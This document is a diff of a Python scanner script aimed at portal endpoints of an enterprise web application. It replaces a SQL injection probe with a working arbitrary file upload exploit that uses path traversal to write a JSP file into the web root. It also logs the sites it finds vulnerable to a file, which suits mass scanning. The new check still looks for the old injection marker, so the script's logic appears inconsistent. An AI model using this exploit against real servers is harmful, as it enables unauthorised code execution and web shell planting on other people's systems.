@@ -2,18 +2,23 @@ import sys
 import requests
 import argparse
 
-
-# 漏洞检测模块
 def checkVuln(url):
     if not url.startswith(('http://', 'https://')):
         url = f"http://{url}"
-    vulnurl = url + "/portal/pt/task/process?pageId=login&id=1&pluginid=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHR(113)||CHR(118)||CHR(98)||CHR(118)||CHR(113)||CHR(113)||CHR(107)||CHR(98)||CHR(106)||CHR(113),NULL,NULL,NULL,NULL,NULL,NULL%20FROM%20DUAL--%20"
+    data = """
+--d0b7a0d40eed0e32904c8017b09eb305Content-
+    Disposition:form-data;name="file";filename="test.jsp"Content-Type: text/plain
+    
+    <%out.print("hello world");%>
+--d0b7a0d40eed0e32904c8017b09eb305--
+        """
+    vulnurl = url + "/portal/pt/file/upload?pageId=login&filemanager=nc.uap.lfw.file.FileManager&iscover=true&billitem=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwebapps%5Cnc_web%5C"
     headers = {
         'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
-        'Content-Type': 'application/x-www-form-urlencoded'
+        'Content-Type': 'multipart/form-data;boundary=d0b7a0d40eed0e32904c8017b09eb305'
     }
     try:
-        response = requests.get(vulnurl, headers=headers,timeout=5, verify=False)
+        response = requests.get(vulnurl, headers=headers,data=data,timeout=5, verify=False)
         if "Plugin qvbvqqkbjq validate fail" in response.text:
             print(f"【+】当前网址存在漏洞：{url}")
             with open("../vuln1.txt", "a+") as f:
